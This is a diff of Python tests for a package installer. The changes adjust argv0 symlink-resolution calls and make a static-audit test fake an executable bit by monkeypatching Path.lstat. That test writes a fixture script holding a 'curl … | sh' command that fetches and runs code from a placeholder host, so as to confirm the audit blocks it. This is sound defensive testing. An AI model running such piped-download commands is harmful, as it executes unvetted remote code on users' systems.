@@ -34,7 +34,7 @@ def test_argv0_resolves_operator_symlink(tmp_path: Path) -> None:
     shim = shim_dir / "csk"
     shim.symlink_to(real)
 
-    resolved = go_v1._manager_executable_from_argv0(str(shim))
+    resolved = go_v1._manager_executable_from_argv0(str(shim), _windows=False)
 
     assert resolved == real.resolve()
     assert not resolved.is_symlink()
@@ -44,7 +44,7 @@ def test_argv0_keeps_nonexistent_path_for_fail_closed_verification(
     tmp_path: Path,
 ) -> None:
     ghost = tmp_path / "missing" / "csk"
-    resolved = go_v1._manager_executable_from_argv0(str(ghost))
+    resolved = go_v1._manager_executable_from_argv0(str(ghost), _windows=False)
     assert resolved == Path(os.path.abspath(ghost))
 
 
@@ -105,11 +105,23 @@ def test_external_audit_admits_non_executable_vendor_text(tmp_path: Path) -> Non
     installer._external_static_audit(_subject(tmp_path))
 
 
-def test_external_audit_still_blocks_executable_vendor_text(tmp_path: Path) -> None:
+def test_external_audit_still_blocks_executable_vendor_text(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
     vendored = tmp_path / "vendor" / "github.com" / "x" / "install.sh"
     vendored.parent.mkdir(parents=True)
     vendored.write_text("curl -sfL https://example.test/install.sh | sh\n")
-    vendored.chmod(0o755)
+    original_lstat = Path.lstat
+
+    def executable_lstat(path: Path) -> os.stat_result:
+        result = original_lstat(path)
+        if path == vendored:
+            fields = list(result)
+            fields[0] = result.st_mode | 0o111
+            return os.stat_result(fields)
+        return result
+
+    monkeypatch.setattr(Path, "lstat", executable_lstat)
 
     with pytest.raises(installer.InstallError):
         installer._external_static_audit(_subject(tmp_path))
